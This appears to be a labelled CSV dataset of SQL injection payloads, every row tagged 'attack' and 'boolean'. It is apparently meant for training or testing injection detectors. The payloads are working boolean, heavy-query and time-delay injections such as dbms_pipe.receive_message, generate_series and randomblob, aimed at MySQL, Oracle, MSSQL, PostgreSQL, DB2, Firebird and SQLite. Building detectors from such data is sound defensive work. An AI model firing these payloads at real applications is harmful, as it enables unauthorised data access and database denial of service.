label,payload,family
attack,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou",boolean
attack,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",boolean
attack,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",boolean
attack,"-2982' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'iqwn'  =  'iqwn",boolean
attack,"1%'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",boolean
attack,"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""mzhk""  =  ""mzhk",boolean
attack,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",boolean
attack,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",boolean
attack,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",boolean
attack,"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""oyou""  =  ""oyou",boolean
attack,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'ywxc'  =  'ywxc",boolean
attack,"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,1  )   as pqle where 4039  =  4039 and 7533  =  7533--,boolean
attack,"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,boolean
attack,1  )   and   (  3020  =  3020  )  *6703,boolean
attack,"1   )    )    as aqpy where 4027  =  4027 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"-9136'  )   or make_set  (  9354  =  9354,7185  )  ",boolean
attack,"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",boolean
attack,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,boolean
attack,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh",boolean
attack,"1'   )    )    and make_set  (  1002  =  3556,3556  )   and    (    (   'mfao'  =  'mfao",boolean
attack,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",boolean
attack,"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",boolean
attack,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",boolean
attack,"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,boolean
attack,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",boolean
attack,"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",boolean
attack,"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --",boolean
attack,"1'||  (  select 'fcnb' where 2869  =  2869 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",boolean
attack,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",boolean
attack,"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",boolean
attack,"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean
attack,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",boolean
attack,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",boolean
attack,"-2067"" or 3038  =  3038",boolean
attack,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",boolean
attack,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,boolean
attack,1  )   as lvfu where 5831  =  5831 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,boolean
attack,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",boolean
attack,-2504'   )    )     )   or 8723  =  9715,boolean
attack,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx",boolean
attack,"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'",boolean
attack,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",boolean
attack,"1""  )   where 6823  =  6823 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'ijyi'  =  'ijyi",boolean
attack,"-5165'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zpnv' like 'zpnv",boolean
attack,"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",boolean
attack,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,boolean
attack,1'+  (  select ggah where 3263  =  3263 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",boolean
attack,1'+  (  select 'luhy' where 3112  =  3112 and   (  3020  =  3020  )  *6703  )  +',boolean
attack,"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",boolean
attack,-1436' or 5699  =  5783--,boolean
attack,"1"" where 2512  =  2512 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,boolean
attack,"1"" where 2619  =  2619 and 2823  =  5100#",boolean
attack,"1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm",boolean
attack,"1"" where 4652  =  4652 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",boolean
attack,1' where 5819  =  5819 and   (  1275  =  4759  )  *4759--,boolean
attack,1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,boolean
attack,"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'qvyq' like 'qvyq",boolean
attack,-8292%'  )   or 8571  =  8571--,boolean
attack,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",boolean
attack,"1""  )   where 4180  =  4180 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,boolean
attack,"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",boolean
attack,"1""   )    )     )   and 5429  =  9596",boolean
attack,"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",boolean
attack,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",boolean
attack,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,boolean
attack,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",boolean
attack,"1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",boolean
attack,"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl",boolean
attack,"-5800""  )   or 6872  =  6872 and   (  ""tcab"" like ""tcab",boolean
attack,1' and 9198  =  9198--,boolean
attack,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean
attack,"1'+  (  select 'midn' where 2819  =  2819 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",boolean
attack,"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"-5630""  )   or 3038  =  3038",boolean
attack,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,1%'   )    )     )   and   (  9404  =  8390  )  *8390 and    (    (     (  '%'  =  ',boolean
attack,"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '",boolean
attack,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",boolean
attack,1%'  )   and 9198  =  9198--,boolean
attack,"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj",boolean
attack,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",boolean
attack,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",boolean
attack,"1' in boolean mode  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",boolean
attack,-3161'  )   or 8501  =  1796,boolean
attack,"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",boolean
attack,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",boolean
attack,1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",boolean
attack,"-9721' or elt  (  9511  =  9238,9238  )  ",boolean
attack,-2820'   )    )    or 6679  =  8848--,boolean
attack,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",boolean
attack,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,boolean
attack,"1   )    )    as kgit where 1919  =  1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,boolean
attack,"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,1 and 7533  =  7533-- spzi,boolean
attack,"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",boolean
attack,"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1"" where 4294  =  4294 and make_set  (  2543  =  7988,7988  )  --",boolean
attack,1'   )    )    and 4595  =  4595#,boolean
attack,-6680'  )   or 5483  =  3031 and   (  'zxes'  =  'zxes,boolean
attack,"1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz",boolean
attack,1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'pneh' like 'pneh,boolean
attack,"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",boolean
attack,"1%"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,boolean
attack,-8710 or 9323  =  9323#,boolean
attack,"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""iuzv"" like ""iuzv",boolean
attack,"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",boolean
attack,"-4721'  )   or elt  (  4378  =  5165,5165  )   and   (  'fufn'  =  'fufn",boolean
attack,"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""fpwu"" like ""fpwu",boolean
attack,"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,-9327'  )   or 3038  =  3038,boolean
attack,"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,"-1083%""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""%""  =  """,boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh",boolean
attack,"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",boolean
attack,"1'  )   as jwvp where 5231  =  5231 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1%'  )   and make_set  (  1458  =  3902,3902  )   and   (  '%'  =  '",boolean
attack,"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",boolean
attack,"1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",boolean
attack,"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",boolean
attack,"1'+  (  select 'ndpx' where 4061  =  4061 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1"" where 5552  =  5552 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',boolean
attack,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'qeet'  =  'qeet",boolean
attack,1' and 7533  =  7533 and 'clqy' like 'clqy,boolean
attack,"1%""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,boolean
attack,"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xonc'  =  'xonc",boolean
attack,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",boolean
attack,1'   )    )    and 7230  =  2517,boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",boolean
attack,1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',boolean
attack,"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1"" and 6637  =  2321",boolean
attack,"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",boolean
attack,-4835   )    )     )   or   (  4219  =  2081  )  *2081 and    (    (     (  8536  =  8536,boolean
attack,"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
